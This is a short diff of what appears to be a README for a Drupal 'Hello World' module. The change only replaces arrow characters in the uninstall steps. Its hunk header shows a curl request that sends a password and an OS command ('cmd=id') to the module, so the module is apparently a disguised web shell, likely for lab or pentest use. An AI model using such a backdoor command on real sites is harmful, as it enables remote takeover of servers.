@@ -76,7 +76,7 @@ curl -s "http://192.168.5.17/hello-world?pass=test&cmd=id" | head -n 1
 
 6. [optional] uninstall module - uninstall module via GUI
 
-*Drupal -> Extend -> [tab] Uninstall -> (filter by name) hello -> (mark checkbox) Hello World -> Uninstall -> Uninstall*
+*Drupal ➔ Extend ➔ [tab] Uninstall ➔ (filter by name) hello ➔ (mark checkbox) Hello World ➔ Uninstall ➔ Uninstall*
 
 7. [optional] uninstall module - remove module from filesystem
 
